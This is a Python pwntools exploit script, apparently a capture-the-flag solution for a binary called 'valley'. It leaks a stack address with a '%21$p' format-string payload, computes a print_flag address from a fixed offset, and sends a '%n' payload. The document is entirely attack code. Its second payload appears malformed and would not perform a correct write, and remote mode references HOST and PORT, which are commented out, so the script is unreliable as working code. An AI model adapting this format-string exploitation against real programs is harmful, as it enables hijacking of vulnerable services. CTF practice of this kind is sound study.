#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'info'
context.arch = 'amd64'  # Change as needed

# Binary and connection settings
BINARY = './valley'  # Replace with actual binary name
#HOST = 'host.example.com'  # Replace with actual host
#PORT = 1234  # Replace with actual port

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):
    payload_1 = b"%21$p"
    conn.sendline(payload_1)

    response = conn.recv().decode("utf-8")
    log.info(f"Raw response: {response}")

    response_addr = response.split("0x")
    main_addr = int(response_addr[1], 16)

    #offset is 0x1AA
    print_flag_addr = main_addr + 0x1AA

    print(f"Calculated flag_addr: {hex(print_flag_addr)}")
    conn.sendline(f"%n 0x{print_flag_addr:x}".encode())
    response = conn.recv().decode("utf-8")
    log.info(f"Raw response: {response}")


    
def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()